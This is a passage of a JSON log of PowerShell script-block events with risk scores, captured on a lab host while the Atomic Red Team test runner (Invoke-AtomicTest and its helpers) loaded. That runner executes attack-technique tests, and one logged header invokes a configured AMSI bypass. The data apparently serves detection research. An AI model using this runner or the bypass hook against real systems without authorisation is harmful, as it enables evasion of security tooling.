$targetUser, $isWindows) {\n\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:54.4632217+00:00",
      "event_id": 35710585,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1000,
      "full_command": "function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {\n    $FailureReasons = New-Object System.Collections.ArrayList\n    if ( $test.executor.elevation_required -and -not $isElevated) {\n        $FailureReasons.add(\"Elevation required but not provided`n\") | Out-Null\n    }\n    foreach ($dep in $test.dependencies) {\n        $executor = Get-PrereqExecutor $test\n        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n        if ($executor -ne \"powershell\") { $final_command = ($final_Command.trim()).Replace(\"`n\", \" && \") }\n        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session\n        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n        if ($res.ExitCode -ne 0) {\n            $FailureReasons.add($description) | Out-Null\n        }\n    }\n    $FailureReasons\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.1419573+00:00",
      "event_id": 35710672,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 847,
      "full_command": "#requires -Version 5.0\n\n# execute amsi bypass if configured to use one\nif([bool]$artConfig.absb -and ($artConfig.OS -eq \"windows\")){\n    $artConfig.absb.Invoke()\n}\n\n#Get public and private function definition files.\n$Public = @( Get-ChildItem -Path $PSScriptRoot\\Public\\*.ps1 -Recurse -Exclude AtomicRunnerService.ps1 -ErrorAction SilentlyContinue )\n$Private = @( Get-ChildItem -Path $PSScriptRoot\\Private\\*.ps1 -Recurse -Exclude \"AtomicClassSchema.ps1\" -ErrorAction SilentlyContinue )\n\n# Make sure the Atomic Class Schema is available first (a workaround so PSv5.0 doesn't give errors)\n. \"$PSScriptRoot\\Private\\AtomicClassSchema.ps1\"\n\n#Dot source the files\nForeach ($import in @($Public + $Private)) {\n    Try {\n        . $import.fullname\n    }\n    Catch {\n        Write-Error -Message \"Failed to import function $($import.fullname): $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2133599+00:00",
      "event_id": 35710692,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 12097,
      "full_command": "ed_platforms) {\n                if ($cloud -contains $platform) {\n                    return $(Test-Path -Path $pathToTerraform)\n                }\n            }\n            return $false\n        }\n\n        function Build-TFVars($AT, $testCount, $InputArgs) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            if ($InputArgs) {\n                $destinationVarsPath = Join-Path \"$tmpDirPath\" \"terraform.tfvars.json\"\n                $InputArgs | ConvertTo-Json | Out-File -FilePath $destinationVarsPath\n            }\n        }\n\n        function Remove-TerraformFiles($AT, $testCount) {\n            $tmpDirPath = Join-Path $PathToAtomicsFolder \"\\$AT\\src\\$AT-$testCount\"\n            Write-Host $tmpDirPath\n            $tfStateFile = Join-Path $tmpDirPath \"terraform.tfstate\"\n            $tfvarsFile = Join-Path $tmpDirPath \"terraform.tfvars.json\"\n            if ($(Test-Path $tfvarsFile)) {\n                Remove-Item -LiteralPath $tfvarsFile -Force\n            }\n            if ($(Test-Path $tfStateFile)) {\n                (Get-ChildItem -Path $tmpDirPath).Fullname -match \"terraform.tfstate*\" | Remove-Item -Force\n            }\n        }\n\n        function Invoke-AtomicTestSingle ($AT) {\n\n            $AT = $AT.ToUpper()\n            $pathToYaml = Join-Path $PathToAtomicsFolder \"\\$AT\\$AT.yaml\"\n            if (Test-Path -Path $pathToYaml) { $AtomicTechniqueHash = Get-AtomicTechnique -Path $pathToYaml }\n            else {\n                Write-Host -Fore Red \"ERROR: $PathToYaml does not exist`nCheck your Atomic Number and your PathToAtomicsFolder parameter\"\n                return\n            }\n            $techniqueCount = 0\n            $numAtomicsApplicableToPlatform = 0\n            $techniqueString = \"\"\n            foreach ($technique in $AtomicTechniqueHash) {\n                $techniqueString = $technique.attack_technique[0]\n                $techniqueCount++\n\n                $props = @{\n                    Activity        = \"Running $($technique.display_name.ToString()) Technique\"\n                    Status          = 'Progress:'\n                    PercentComplete = ($techniqueCount / ($AtomicTechniqueHash).Count * 100)\n                }\n                Write-Progress @props\n\n                Write-Debug -Message \"Gathering tests for Technique $technique\"\n\n                $testCount = 0\n                foreach ($test in $technique.atomic_tests) {\n\n                    Write-Verbose -Message 'Determining tests for target platform'\n\n                    $testCount++\n\n                    if (-not $anyOS) {\n                        if ( -not $(Platform-IncludesCloud) -and -Not $test.supported_platforms.Contains($executionPlatform) ) {\n                            Write-Verbose -Message \"Unable to run non-$executionPlatform tests\"\n                            continue\n                        }\n\n                        if ( $executionPlatform -eq \"windows\" -and ($test.executor.name -eq \"sh\" -or $test.executor.name -eq \"bash\")) {\n                            Write-Verbose -Message \"Unable to run sh or bash on $executionPlatform\"\n                            continue\n                        }\n                        if ( (\"linux\", \"macos\") -contains $executionPlatform -and $test.executor.name -eq \"command_prompt\") {\n                            Write-Verbose -Message \"Unable to run cmd.exe on $executionPlatform\"\n                            continue\n                        }\n                    }\n\n\n                    if ($null -ne $TestNumbers) {\n                        if (-Not ($TestNumbers -contains $testCount) ) { continue }\n                    }\n\n                    if ($null -ne $TestNames) {\n                        if (-Not ($TestNames -contains $test.name) ) { continue }\n                    }\n\n                    if ($null -ne $TestGuids) {\n                        if (-Not ($TestGuids -contains $test.auto_generated_guid) ) { continue }\n                    }\n\n                    $props = @{\n                        Activity        = 'Running Atomic Tests'\n                        Status          = 'Progress:'\n                        PercentComplete = ($testCount / ($technique.atomic_tests).Count * 100)\n                    }\n                    Write-Progress @props\n\n                    Write-Verbose -Message 'Determining manual tests'\n\n                    if ($test.executor.name.Contains('manual')) {\n                        Write-Verbose -Message 'Unable to run manual tests'\n                        continue\n                    }\n                    $numAtomicsApplicableToPlatform++\n\n                    $testId = \"$AT-$testCount $($test.name)\"\n                    if ($ShowDetailsBrief) {\n                        Write-KeyValue $testId\n                        continue\n                    }\n\n                    if ($PromptForInputArgs) {\n                        $InputArgs = Invoke-PromptForInputArgs $test.input_arguments\n                    }\n\n                    if ($ShowDetails) {\n                        Show-Details $test $testCount $technique $InputArgs $PathToPayloads\n                        continue\n                    }\n\n                    Write-Debug -Message 'Gathering final Atomic test command'\n\n\n                    if ($CheckPrereqs) {\n                        Write-KeyValue \"CheckPrereq's for: \" $testId\n                        $failureReasons = Invoke-CheckPrereqs $test $isElevated $executionPlatform $InputArgs $PathToPayloads $TimeoutSeconds $session\n                        Write-PrereqResults $FailureReasons $testId\n                    }\n                    elseif ($GetPrereqs) {\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Build-TFVars $AT $testCount $InputArgs\n                        }\n                        Write-KeyValue \"GetPrereq's for: \" $testId\n                        if ( $test.executor.elevation_required -and -not $isElevated) {\n                            Write-Host -ForegroundColor Red \"Elevation required but not provided\"\n                        }\n                        if ($nul -eq $test.dependencies) { Write-KeyValue \"No Preqs Defined\"; continue }\n                        foreach ($dep in $test.dependencies) {\n                            $executor = Get-PrereqExecutor $test\n                            $description = (Merge-InputArgs $dep.description $test $InputArgs $PathToPayloads).trim()\n                            Write-KeyValue  \"Attempting to satisfy prereq: \" $description\n                            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $InputArgs $PathToPayloads\n                            if ($executor -ne \"powershell\") { $final_command_prereq = ($final_command_prereq.trim()).Replace(\"`n\", \" && \") }\n                            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $InputArgs $PathToPayloads\n                            $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n\n                            if ($res.ExitCode -eq 0) {\n                                Write-KeyValue \"Prereq already met: \" $description\n                            }\n                            else {\n                                $res = Invoke-ExecuteCommand $final_command_get_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                                $res = Invoke-ExecuteCommand $final_command_prereq $executor $executionPlatform $TimeoutSeconds $session -Interactive:$true\n                                if ($res.ExitCode -eq 0) {\n                                    Write-KeyValue \"Prereq successfully met: \" $description\n                                }\n                                else {\n                                    Write-Host -ForegroundColor Red \"Failed to meet prereq: $description\"\n                                }\n                            }\n                        }\n                    }\n                    elseif ($Cleanup) {\n                        Write-KeyValue \"Executing cleanup for test: \" $testId\n                        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicCleanupHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-KeyValue \"Done executing cleanup for test: \" $testId\n                        if (Get-Command 'Invoke-ARTPostAtomicCleanupHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicCleanupHook $test $InputArgs }\n                        if ($(Test-IncludesTerraform $AT $testCount)) {\n                            Remove-TerraformFiles $AT $testCount\n                        }\n                    }\n                    else {\n                        Write-KeyValue \"Executing test: \" $testId\n                        $startTime = Get-Date\n                        $final_command = Merge-InputArgs $test.executor.command $test $InputArgs $PathToPayloads\n                        if (Get-Command 'Invoke-ARTPreAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPreAtomicHook $test $InputArgs }\n                        $res = Invoke-ExecuteCommand $final_command $test.executor.name $executionPlatform $TimeoutSeconds $session -Interactive:$Interactive\n                        Write-Host \"Exit code: $($res.ExitCode)\"\n                        if (Get-Command 'Invoke-ARTPostAtomicHook' -errorAction SilentlyContinue) { Invoke-ARTPostAtomicHook $test $InputArgs }\n                        $stopTime = Get-Date\n                        if ($isLoggingModuleSet) {\n                            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                                &\"$_\\Write-ExecutionLog\" $startTime $stopTime $AT $testCount $test.name $test.auto_generated_guid $test.executor.name $test.description $final_command $ExecutionLogPath $executionHostname $executionUser $res (-Not($IsLinux -or $IsMacOS))\n                            }\n                        }\n                        Write-KeyValue \"Done executing test: \" $testId\n                    }\n\n                } # End of foreach Test in single Atomic Technique\n            } # End of foreach Technique in Atomic Tests\n            if ($numAtomicsApplicableToPlatform -eq 0) {\n                Write-Host -ForegroundColor Yellow \"Found $numAtomicsApplicableToPlatform atomic tests applicable to $executionPlatform platform for Technique $techniqueString\"\n            }\n        } # End of Invoke-AtomicTestSingle function\n\n        if ($AtomicTechnique -eq \"All\") {\n            function Invoke-AllTests() {\n                $AllAtomicTests = New-Object System.Collections.ArrayList\n                Get-ChildItem $PathToAtomicsFolder -Directory -Filter T* | ForEach-Object {\n                    $currentTechnique = [System.IO.Path]::GetFileName($_.FullName)\n                    if ( $currentTechnique -match \"T[0-9]{4}.?([0-9]{3})?\" ) { $AllAtomicTests.Add($currentTechnique) | Out-Null }\n                }\n                $AllAtomicTests.GetEnumerator() | Foreach-Object { Invoke-AtomicTestSingle $_ }\n            }\n\n            if ( ($Force -or $CheckPrereqs -or $ShowDetails -or $ShowDetailsBrief -or $GetPrereqs) -or $psCmdlet.ShouldContinue( 'Do you wish to execute all tests?',\n                    \"Highway to the danger zone, Executing All Atomic Tests!\" ) ) {\n                Invoke-AllTests\n            }\n        }\n        else {\n            Invoke-AtomicTestSingle $AtomicTechnique\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                &\"$_\\Stop-ExecutionLog\" $startTime $ExecutionLogPath $executionHostname $executionUser (-Not($IsLinux -or $IsMacOS))\n            }\n        }\n\n    } # End of PROCESS block\n    END { } # Intentionally left blank and can be removed\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.0693534+00:00",
      "event_id": 35710870,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 3689,
      "full_command": "'elevation_required')) {\n                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {\n                    Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.\"\n                    return\n                }\n\n                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']\n            }\n            else {\n                # if elevation_required is not present, default to false\n                $ExecutorInstance.elevation_required = $False\n            }\n\n            $InputArgumentNames = $null\n\n            # Get all input argument names\n            $InputArgumentNames = $InputArguments.Keys\n\n            # Extract all input arguments names from the executor\n            # Potential places where input arguments can be populated:\n            #  - Dependency description\n            #  - Dependency prereq_command\n            #  - Dependency get_prereq_command\n            #  - Executor steps\n            #  - Executor command\n            #  - Executor cleanup_command\n\n            $Regex = [Regex] '#\\{(?<ArgName>[^}]+)\\}'\n            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |\n            ForEach-Object { $Regex.Matches($_) } |\n            Select-Object -ExpandProperty Groups |\n            Where-Object { $_.Name -eq 'ArgName' } |\n            Select-Object -ExpandProperty Value |\n            Sort-Object -Unique\n\n\n            # Validate that all executor input arg names are defined input arg names.\n            if ($InputArgumentNamesFromExecutor.Count) {\n                $InputArgumentNamesFromExecutor | ForEach-Object {\n                    if ($InputArgumentNames -notcontains $_) {\n                        Write-Error \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'\"\n                        return\n                    }\n                }\n            }\n\n            # Validate that all defined input args are utilized at least once in the executor.\n            if ($InputArgumentNames.Count) {\n                $InputArgumentNames | ForEach-Object {\n                    if ($InputArgumentNamesFromExecutor -notcontains $_) {\n                        # Write a warning since this scenario is not considered a breaking change\n                        Write-Warning \"$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.\"\n                    }\n                }\n            }\n\n            $ExecutorInstance.name = $AtomicTest['executor']['name']\n\n            $AtomicTestInstance.executor = $ExecutorInstance\n\n            $AtomicTests[$i] = $AtomicTestInstance\n        }\n\n        $AtomicInstance.atomic_tests = $AtomicTests\n\n        $AtomicInstance\n    }\n}\n\n\n# Tab completion for Atomic Tests\nfunction Get-TechniqueNumbers {\n    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }\n    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |\n    ForEach-Object { $_.BaseName }\n\n    return $techniqueNumbers\n}\n\nRegister-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {\n    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)\n\n    Get-TechniqueNumbers | Where-Object { $_ -like \"$wordToComplete*\" } |\n    ForEach-Object {\n        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', \"Technique number $_\"\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 2,
      "message_total": 2,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1459767+00:00",
      "event_id": 35710924,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1945,
      "full_command": "function Get-InputArgs([hashtable]$ip, $customInputArgs, $PathToAtomicsFolder) {\n    $defaultArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $defaultArgs[$key] = $ip[$key].default\n    }\n    # overwrite defaults with any user supplied values\n    foreach ($key in $customInputArgs.Keys) {\n        if ($defaultArgs.Keys -contains $key) {\n            # replace default with user supplied\n            $defaultArgs.set_Item($key, $customInputArgs[$key])\n        }\n        else {\n            Write-Verbose \"The specified input argument *$key* was ignored as not applicable\"\n        }\n    }\n    $defaultArgs\n}\n\nfunction Merge-InputArgs($finalCommand, $test, $customInputArgs, $PathToAtomicsFolder) {\n    if (($null -ne $finalCommand) -and ($test.input_arguments.Count -gt 0)) {\n        Write-Verbose -Message 'Replacing inputArgs with user specified values, or default values if none provided'\n        $inputArgs = Get-InputArgs $test.input_arguments $customInputArgs $PathToAtomicsFolder\n\n        foreach ($key in $inputArgs.Keys) {\n            $findValue = '#{' + $key + '}'\n            $finalCommand = $finalCommand.Replace($findValue, $inputArgs[$key])\n        }\n    }\n\n    # Replace $PathToAtomicsFolder or PathToAtomicsFolder with the actual -PathToAtomicsFolder value\n    $finalCommand = ($finalCommand -replace \"\\`$PathToAtomicsFolder\", $PathToAtomicsFolder) -replace \"PathToAtomicsFolder\", $PathToAtomicsFolder\n\n    $finalCommand\n}\n\nfunction Invoke-PromptForInputArgs([hashtable]$ip) {\n    $InputArgs = @{ }\n    foreach ($key in $ip.Keys) {\n        $InputArgs[$key] = $ip[$key].default\n        $newValue = Read-Host -Prompt \"Enter a value for $key , or press enter to accept the default.`n$($ip[$key].description.trim()) [$($ip[$key].default.trim())]\"\n        # replace default with user supplied\n        if (-not [string]::IsNullOrWhiteSpace($newValue)) {\n            $InputArgs.set_Item($key, $newValue)\n        }\n    }\n    $InputArgs\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2250983+00:00",
      "event_id": 35710701,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 426,
      "full_command": "function Invoke-KillProcessTree {\n    Param([int]$ppid)\n    if ($IsLinux -or $IsMacOS) {\n        sh -c \"pkill -9 -P $ppid\"\n    }\n    else {\n        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {\n            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }\n        }\n        Stop-Process -Id $ppid -ErrorAction Ignore\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1346101+00:00",
      "event_id": 35710915,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 1000,
      "full_command": "function Invoke-CheckPrereqs ($test, $isElevated, $executionPlatform, $customInputArgs, $PathToAtomicsFolder, $TimeoutSeconds, $session = $null) {\n    $FailureReasons = New-Object System.Collections.ArrayList\n    if ( $test.executor.elevation_required -and -not $isElevated) {\n        $FailureReasons.add(\"Elevation required but not provided`n\") | Out-Null\n    }\n    foreach ($dep in $test.dependencies) {\n        $executor = Get-PrereqExecutor $test\n        $final_command = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder\n        if ($executor -ne \"powershell\") { $final_command = ($final_Command.trim()).Replace(\"`n\", \" && \") }\n        $res = Invoke-ExecuteCommand $final_command $executor $executionPlatform $TimeoutSeconds  $session\n        $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder\n        if ($res.ExitCode -ne 0) {\n            $FailureReasons.add($description) | Out-Null\n        }\n    }\n    $FailureReasons\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1278768+00:00",
      "event_id": 35710909,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 195,
      "full_command": "function Get-PrereqExecutor ($test) {\n    if ($nul -eq $test.dependency_executor_name) { $executor = $test.executor.name }\n    else { $executor = $test.dependency_executor_name }\n    $executor\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:56.1024456+00:00",
      "event_id": 35710892,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 426,
      "full_command": "function Invoke-KillProcessTree {\n    Param([int]$ppid)\n    if ($IsLinux -or $IsMacOS) {\n        sh -c \"pkill -9 -P $ppid\"\n    }\n    else {\n        while ($null -ne ($gcim = Get-CimInstance Win32_Process | Where-Object { $_.ParentProcessId -eq $ppid })) {\n            $gcim | ForEach-Object { Invoke-KillProcessTree $_.ProcessId; Start-Sleep -Seconds 0.5 }\n        }\n        Stop-Process -Id $ppid -ErrorAction Ignore\n    }\n}\n",
      "computer": "ar-win-5.attackrange.local",
      "user_sid": "S-1-5-21-1731938146-2314223186-1848411941-500",
      "message_number": 1,
      "message_total": 1,
      "matched_patterns": ""
    },
    {
      "timestamp": "2024-12-16T20:34:55.2133155+00:00",
      "event_id": 35710691,
      "risk_score": 1,
      "detected_patterns": ", Get",
      "pattern_details": "Get [Score: 1]",
      "command_length": 12161,
      "full_command": "function Invoke-AtomicTest {\n    [CmdletBinding(DefaultParameterSetName = 'technique',\n        SupportsShouldProcess = $true,\n        PositionalBinding = $false,\n        ConfirmImpact = 'Medium')]\n    Param(\n        [Parameter(Mandatory = $true,\n            Position = 0,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [ValidateNotNullOrEmpty()]\n        [String[]]\n        $AtomicTechnique,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetails,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $ShowDetailsBrief,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $anyOS,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNumbers,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestNames,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String[]]\n        $TestGuids,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $PathToAtomicsFolder = $( if ($IsLinux -or $IsMacOS) { $Env:HOME + \"/AtomicRedTeam/atomics\" } else { $env:HOMEDRIVE + \"\\AtomicRedTeam\\atomics\" }),\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $CheckPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $PromptForInputArgs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $GetPrereqs = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Cleanup = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $NoExecutionLog = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $ExecutionLogPath = $( if ($IsLinux -or $IsMacOS) { \"/tmp/Invoke-AtomicTest-ExecutionLog.csv\" } else { \"$env:TEMP\\Invoke-AtomicTest-ExecutionLog.csv\" }),\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Force,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [HashTable]\n        $InputArgs,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [Int]\n        $TimeoutSeconds = 120,\n\n        [Parameter(Mandatory = $false, ParameterSetName = 'technique')]\n        [System.Management.Automation.Runspaces.PSSession[]]$Session,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $Interactive = $false,\n\n        [Parameter(Mandatory = $false,\n            ValueFromPipelineByPropertyName = $true,\n            ParameterSetName = 'technique')]\n        [switch]\n        $KeepStdOutStdErrFiles = $false,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [String]\n        $LoggingModule,\n\n        [Parameter(Mandatory = $false,\n            ParameterSetName = 'technique')]\n        [switch]\n        $SupressPathToAtomicsFolder = $false\n\n    )\n    BEGIN { } # Intentionally left blank and can be removed\n    PROCESS {\n        function ConvertTo-LoggerArray {\n            param (\n                [Parameter(Mandatory = $true)]\n                [string]$Loggers\n            )\n\n            return $Loggers -split ',' | ForEach-Object { $_.Trim() }\n        }\n\n        $PathToAtomicsFolder = (Resolve-Path $PathToAtomicsFolder).Path\n\n        Write-Verbose -Message 'Attempting to run Atomic Techniques'\n        if (-not $supressPathToAtomicsFolder) { Write-Host -ForegroundColor Cyan \"PathToAtomicsFolder = $PathToAtomicsFolder`n\" }\n\n        $executionPlatform, $isElevated, $tmpDir, $executionHostname, $executionUser = Get-TargetInfo $Session\n        $PathToPayloads = if ($Session) { \"$tmpDir`AtomicRedTeam\" }  else { $PathToAtomicsFolder }\n\n        # Since there might a comma(T1559-1,2,3) Powershell takes it as array.\n        # So converting it back to string.\n        if ($AtomicTechnique -is [array]) {\n            $AtomicTechnique = $AtomicTechnique -join \",\"\n        }\n\n        # Splitting Atomic Technique short form into technique and test numbers.\n        $AtomicTechniqueParams = ($AtomicTechnique -split '-')\n        $AtomicTechnique = $AtomicTechniqueParams[0]\n\n        if ($AtomicTechniqueParams.Length -gt 1) {\n            $ShortTestNumbers = $AtomicTechniqueParams[-1]\n        }\n\n        if ($null -eq $TestNumbers -and $null -ne $ShortTestNumbers) {\n            $TestNumbers = $ShortTestNumbers -split ','\n        }\n\n        $isLoggingModuleSet = $false\n        if (-not $NoExecutionLog) {\n            $isLoggingModuleSet = $true\n            if (-not $PSBoundParameters.ContainsKey('LoggingModule')) {\n                # no logging module explicitly set\n                # syslog logger\n                $syslogOptionsSet = [bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort\n                if ( $artConfig.LoggingModule -eq \"Syslog-ExecutionLogger\" -or (($artConfig.LoggingModule -eq '') -and $syslogOptionsSet) ) {\n                    if ($syslogOptionsSet) {\n                        $LoggingModule = \"Syslog-ExecutionLogger\"\n                    }\n                    else {\n                        Write-Host -Fore Yellow \"Config.ps1 specified: Syslog-ExecutionLogger, but the syslogServer and syslogPort must be specified. Using the default logger instead\"\n                        $LoggingModule = \"Default-ExecutionLogger\"\n                    }\n                }\n                elseif (-not [bool]$artConfig.LoggingModule) {\n                    # loggingModule is blank (not set), so use the default logger\n                    $LoggingModule = \"Default-ExecutionLogger\"\n                }\n                else {\n                    $LoggingModule = $artConfig.LoggingModule\n                }\n            }\n        }\n\n        if ($isLoggingModuleSet) {\n            ConvertTo-LoggerArray $LoggingModule | ForEach-Object {\n                if (Get-Module -name $_) {\n                    Write-Verbose \"Using Logger: $_\"\n                }\n                else {\n                    Write-Host -Fore Yellow \"Logger not found: \", $_\n                }\n\n                # Change the defult logFile extension from csv to json and add a timestamp if using the Attire-ExecutionLogger\n                if ($_ -eq \"Attire-ExecutionLogger\") { $ExecutionLogPath = $ExecutionLogPath.Replace(\"Invoke-AtomicTest-ExecutionLog.csv\", \"Invoke-AtomicTest-ExecutionLog-timestamp.json\") }\n                $ExecutionLogPath = $ExecutionLogPath.Replace(\"timestamp\", $(Get-Date -UFormat %s))\n\n                if (Get-Command \"$_\\Start-ExecutionLog\" -erroraction silentlycontinue) {\n                    if (Get-Command \"$_\\Write-ExecutionLog\" -erroraction silentlycontinue) {\n                        if (Get-Command \"$_\\Stop-ExecutionLog\" -erroraction silentlycontinue) {\n                            Write-Verbose \"All logging commands found\"\n                        }\n                        else {\n                            Write-Host \"Stop-ExecutionLog not found or loaded from the wrong module\"\n                            return\n                        }\n                    }\n                    else {\n                        Write-Host \"Write-ExecutionLog not found or loaded from the wrong module\"\n                        return\n                    }\n                }\n                else {\n                    Write-Host \"Start-ExecutionLog not found or loaded from the wrong module\"\n                    return\n                }\n            }\n\n            # Here we're rebuilding an equivalent command line to put in the logs\n            $commandLine = \"Invoke-AtomicTest $AtomicTechnique\"\n\n            if ($ShowDetails -ne $false) {\n                $commandLine = \"$commandLine -ShowDetails $ShowDetails\"\n            }\n\n            if ($ShowDetailsBrief -ne $false) {\n                $commandLine = \"$commandLine -ShowDetailsBrief $ShowDetailsBrief\"\n            }\n\n            if ($null -ne $TestNumbers) {\n                $commandLine = \"$commandLine 